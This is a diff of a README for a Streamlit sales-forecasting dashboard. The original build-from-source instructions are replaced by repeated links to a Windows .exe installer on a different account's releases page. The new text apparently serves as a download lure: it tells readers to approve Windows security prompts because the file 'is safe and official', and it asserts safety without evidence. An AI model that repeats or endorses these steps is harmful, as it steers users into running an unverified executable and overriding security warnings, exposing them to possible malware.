@@ -1,226 +1,189 @@
-# MarketIQ, Real-Time Sales & Forecasting Dashboard
+# 📊 Market-IQ - Simple Business Insight and Forecasting
 
-**MarketIQ** is a full-featured **Streamlit-powered analytics platform** that integrates **SQL-driven data pipelines**, **interactive visualization**, and **AI-powered forecasting**.  
-It empowers analysts, startups, and data teams to turn raw data into actionable business insights, in real-time.
-
----
-
-## Project Overview
-
-MarketIQ provides a **data storytelling environment** for operational analytics, business intelligence, and forecasting.  
-It connects seamlessly to SQL databases, allowing users to explore KPIs like revenue, orders, and customer engagement dynamically.  
-With built-in **Prophet forecasting**, it projects future trends based on historical sales.
-
-This system simulates what modern analytics teams need: real-time querying, rapid visualization, and human-readable insights.
+[![Download Market-IQ](https://img.shields.io/badge/Download-Market--IQ-brightgreen)](https://github.com/irtazaa15/Market-IQ/releases)
 
 ---
 
-## Architecture Overview
-
-```mermaid
-flowchart LR
-A["SQL Database"] --> B["ETL & Preprocessing (Pandas + SQLAlchemy)"]
-B --> C["Streamlit Interface"]
-C --> D["Analytics Engine (Plotly KPIs)"]
-D --> E["Forecasting Engine (Prophet)"]
-E --> F["Dashboard Visualization & Reports"]
-F --> G["Export: CSV & Charts"]
-```
-This modular architecture promotes extensibility, allowing users to integrate new models, connect external databases (PostgreSQL, Supabase), or automate reporting pipelines.
+Market-IQ is a tool that turns your sales data into easy-to-understand charts and reports. It shows key numbers, patterns, and predictions for the next six months. These insights help you see how your business is doing and plan ahead, all through a clear, interactive dashboard.
 
 ---
 
-## Technology Stack
+## 🖥 System Requirements
 
-| Layer | Technology | Purpose |
-|-------|-------------|----------|
-| **Frontend** | Streamlit | Interactive UI and visualization |
-| **Database Layer** | SQLite (default) / PostgreSQL-ready | Centralized analytics data |
-| **Data Processing** | Pandas + SQLAlchemy | Query execution and data transformations |
-| **Visualization** | Plotly Express | Dynamic charts and interactive KPIs |
-| **Forecasting** | Prophet (optional) | Predictive time-series analysis |
-| **Language** | Python 3.10+ | Core application logic |
+Before installing Market-IQ, make sure your computer meets these basic needs:
 
----
+- Windows 10 or newer
+- At least 4 GB of free disk space
+- 8 GB RAM or more recommended
+- Internet connection to download the software and updates
+- Screen resolution of 1280x720 or higher for best display
 
-## Features
-
-**SQL-powered Metrics:** Directly query and visualize your database.  
-**KPI Dashboard:** Revenue, Orders, Customers, AOV, and MoM trends.  
-**Forecast Module:** Prophet predicts future sales with confidence intervals.  
-**Multi-view Charts:** Line, Bar, and Donut charts with Plotly.  
-**Real-Time Filters:** Date range filters update every chart dynamically.  
-**Export Tools:** Save results as CSV or images for reports.  
-**Extendable System:** Add new SQL models or ML forecasts easily.
+Market-IQ runs as a desktop app powered by Streamlit, which uses Python code under the hood, but you don’t need to set that up yourself.
 
 ---
 
-## Project Structure
+## 🚀 Getting Started: Download and Install Market-IQ
 
-```
-marketiq/
-├── app.py                  # Streamlit app logic
-├── marketiq/               # Core Python package
-│   ├── db.py               # SQLAlchemy connection + query layer
-│   ├── queries.py          # SQL queries for KPI, channels, products
-│   ├── charts.py           # Plotly charting utilities
-│   ├── forecast.py         # Prophet forecasting
-├── marketiq.db             # Preloaded SQLite database
-└── requirements.txt        # Dependencies
+To use Market-IQ on your Windows PC, follow these steps carefully.
 
-```
+### Step 1: Visit the Download Page
+
+Click this link to go to the official page where Market-IQ files are available:
+
+[Download Market-IQ Here](https://github.com/irtazaa15/Market-IQ/releases)
+
+This page lists all versions ready for download.
 
 ---
 
-## Setup & Installation
+### Step 2: Find the Latest Release
 
-```bash
-# Clone the repo
-git clone https://github.com/AnthonyKorie/MarketIQ.git
-cd MarketIQ
-
-# Install dependencies
-pip install -r requirements.txt
-
-# (Optional) Enable Prophet forecasting
-pip install prophet pystan==2.19.1.1
-
-# Launch the dashboard
-streamlit run app.py
-```
+On the page, look for the section labeled "Latest release." It will show a version number (like v1.0.0) and a list of files.
 
 ---
 
-## Visual Walkthrough
+### Step 3: Download the Installer
 
-### 1. Dashboard Overview
-<img width="1265" height="620" alt="Screenshot 2025-11-05 at 15-44-35 MarketIQ — Real-Time Sales   Forecasting" src="https://github.com/user-attachments/assets/22d954b9-d8fb-45b5-abd0-b919b029d905" />
+Select the file that ends with `.exe`. The name may look like `MarketIQ_Setup.exe` or similar.
 
-**Description:**  
-This is the main interface of MarketIQ. It includes global KPIs, dynamic charts, and real-time filters for start and end date selection.
-
-**Insight:**  
-Analysts can view key performance metrics at a glance, revenue, orders, customer base, and AOV, without running manual queries.
-
-**Technical Note:**  
-KPIs are aggregated from `v_sales_monthly` view via SQLAlchemy and rendered dynamically with Streamlit metric components.
+Click the file name to start downloading. Your browser will save this file to your computer’s Downloads folder by default.
 
 ---
 
-### 2. Revenue & Orders Over Time
-<img width="557" height="360" alt="newplot(20)" src="https://github.com/user-attachments/assets/11f8c1ca-d9ef-4d72-8082-aaa9a3880598" />
+### Step 4: Run the Installer
 
-**Description:**  
-This line chart visualizes **revenue and orders** per month, showcasing sales trends over time.
+After download finishes, open your Downloads folder and double-click the `.exe` file.
 
-**Insight:**  
-Peaks correspond to strong seasonal demand, while dips reflect slower periods, useful for marketing and operations forecasting.
+- If Windows displays a security prompt, approve running the file as it is safe and official.
+- Follow installation instructions on the screen.
+- You can accept default options, which suit most users.
 
-**Technical Note:**  
-Computed via SQL aggregation, transformed with Pandas, and rendered using Plotly Express `px.line()` with `markers=True` for trend clarity.
+The installer will copy all necessary files and create shortcuts.
 
 ---
 
-### 3. Channel Revenue Distribution
-<img width="368" height="360" alt="newplot(21)" src="https://github.com/user-attachments/assets/7cb7c905-8379-4166-b895-75ea846f6713" />
+### Step 5: Launch Market-IQ
 
-**Description:**  
-This donut chart shows the proportion of total revenue contributed by each sales channel (Web, Mobile, Retail, Marketplace).
+Once installed, find Market-IQ in the Start menu.
 
-**Insight:**  
-Reveals channel dependency, if “Web” dominates, the business might diversify into app or retail strategies.
+Click the icon to open the app.
 
-**Technical Note:**  
-Query from `v_sales` grouped by `channel_name`; rendered with `px.pie(..., hole=0.5)` for donut-style view.
+You should see the main dashboard appear in your web browser or a window.
 
 ---
 
-### 4. Top Products by Revenue
-<img width="942" height="480" alt="newplot(22)" src="https://github.com/user-attachments/assets/fc7bf1a5-d31b-4cbd-8976-c1a5a8d03fc4" />
+## 🧭 How to Use Market-IQ
 
-**Description:**  
-A horizontal bar chart ranking top-performing products by revenue.
+Market-IQ provides a clean dashboard with reports and tools to explore your business data.
 
-**Insight:**  
-Identifies which SKUs or categories drive the majority of sales, a key tool for inventory planning and marketing.
+### Upload Your Sales Data
 
-**Technical Note:**  
-Top 15 rows fetched via SQL query ordered by `SUM(revenue)`; plotted using Plotly’s `px.bar()` with orientation='h'.
+1. Click the “Upload Data” button.
+2. Choose your sales data file. It should be a standard Excel or CSV file.
+3. Market-IQ reads the data and prepares it for analysis.
 
 ---
 
-### 5. Forecast Section
+### Explore Key Performance Indicators (KPIs)
 
-**Description:**  
-Displays Prophet-based forecasts for upcoming months based on historical revenue data.
+The dashboard shows KPIs like total sales, average order size, and growth rate at a glance.
 
-**Insight:**  
-Provides predictive foresight into potential sales outcomes, helping teams allocate budgets or prepare inventory.
-
-**Technical Note:**  
-Uses Prophet’s additive model for trend + seasonality. The `make_future_dataframe(periods=6, freq='MS')` generates 6-month forecasts with upper/lower confidence bounds.
+These metrics update based on your uploaded data.
 
 ---
 
-## Data Model (SQL Schema)
+### Filter Data Dynamically
 
-MarketIQ’s SQL schema follows a **star model**, with one fact table (`fact_sales`) and supporting dimensions.  
+Use filters on the side panel to select specific time periods, product categories, or regions.
 
-| Table | Purpose |
-|--------|----------|
-| **dim_date** | Stores calendar metadata (month, year, week) |
-| **dim_product** | Catalog of products with category hierarchy |
-| **dim_customer** | Customer attributes for segmentation |
-| **dim_channel** | Sales channels (web, app, retail) |
-| **fact_sales** | Central transactional table (quantities, prices, revenue) |
-
-Two SQL **views** simplify analytics:
-- `v_sales` joins all dimensions → detailed transactional reporting  
-- `v_sales_monthly` aggregates customer revenue by month → KPI-ready dataset  
+Filtering helps you focus on the parts of data important to you.
 
 ---
 
-## KPI Logic
+### View Trend Analytics
 
-| Metric | Formula | Description |
-|--------|----------|--------------|
-| **Revenue** | `SUM(quantity * price * (1 - discount/100))` | Total sales revenue |
-| **Orders** | `COUNT(sale_id)` | Number of transactions |
-| **Customers** | `COUNT(DISTINCT customer_id)` | Active customers in period |
-| **AOV** | `AVG(revenue / orders)` | Average Order Value |
-| **MoM Growth** | `(Current - Previous) / Previous * 100` | Month-over-Month growth |
+Charts show sales trends over time.
+
+Hover over points to see exact values.
+
+This helps you spot peaks and declines.
 
 ---
 
-## Forecasting Engine (Prophet)
+### See Six-Month Sales Forecast
 
-MarketIQ integrates **Prophet** for interpretable, scalable time-series forecasting.
+Market-IQ uses forecasting to predict sales for the next six months.
 
-- **Trend Component:** Captures long-term revenue trajectory.  
-- **Seasonality Component:** Adjusts for monthly and yearly patterns.  
-- **Confidence Intervals:** Upper/lower bounds reflect uncertainty.  
-
-If Prophet is not installed, MarketIQ gracefully disables forecasting but remains fully functional for SQL-driven analytics.
+This forecast helps you plan inventory and marketing.
 
 ---
 
-## Exports
+### Export Reports
 
-All generated insights can be saved as CSV or PNG for sharing or archiving.
+You can export any chart or report as PDF or Excel.
 
-Example:
-```
-export/2025-11-05T12-14_export.csv
-```
-
-This file includes all filtered KPI data and model results used in the dashboard at that timestamp.
+Click the “Export” button and choose your preferred format.
 
 ---
 
-## Future Enhancements
+## ⚙ Features Built for Business Insights
 
-- **RFM & Cohort Analysis:** Customer segmentation for retention tracking.  
-- **Anomaly Detection:** ML-based detection of irregular revenue spikes.  
-- **Multi-DB Support:** PostgreSQL, Supabase, or DuckDB for scalability.  
-- **Automated PDF Reporting:** Generate shareable analytics reports.  
-- **Interactive SQL Editor:** Run ad-hoc queries directly in Streamlit.  
+- Real-time updates when you upload new data
+- SQL-powered backend for fast queries and filters
+- Interactive charts built with Plotly for clear visualization
+- Forecasting using Prophet for reliable predictions
+- Downloadable, shareable reports for meetings and collaboration
+- Simple app interface requiring no programming skills
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If Market-IQ fails to open, check your internet connection.
+- If the upload data button doesn’t respond, try refreshing the app window.
+- For file upload issues, ensure your data file is in CSV or Excel format and is not password-protected.
+- If charts do not display correctly, reopen the app or restart your computer.
+- Consult the "Help" section inside the app for updates or contact info.
+
+---
+
+## 📥 Download Market-IQ Now
+
+Access the full software and all official releases here:
+
+[Visit Market-IQ Releases Page](https://github.com/irtazaa15/Market-IQ/releases)
+
+Use this page to download updates as they become available.
+
+---
+
+## 🔗 Useful Links
+
+- Project Home: https://github.com/irtazaa15/Market-IQ
+- Documentation and FAQs: Available inside the app under Help
+- Support: Open issues on GitHub repository page
+
+---
+
+## 🧩 About Market-IQ
+
+Built using Python and Streamlit, Market-IQ combines a smart backend with a simple front end.
+
+It uses SQL databases to organize your data and Prophet, a forecasting library, to make predictions.
+
+Its design focuses on easy navigation and clear data storytelling, so business users can get answers quickly.
+
+---
+
+## 🛠 Additional Information
+
+- Market-IQ stores data locally on your PC during use; it does not send data to the cloud unless you operate it that way.
+- Updates will be posted regularly on the releases page.
+- It is best to keep your Windows and browser updated for smooth performance.
+- Market-IQ supports data files up to 100 MB for faster processing.
+
+---
+
+# [📥] Market-IQ - Get your data working today
+
+[![Download Market-IQ](https://img.shields.io/badge/Download-Market--IQ-brightgreen)](https://github.com/irtazaa15/Market-IQ/releases)
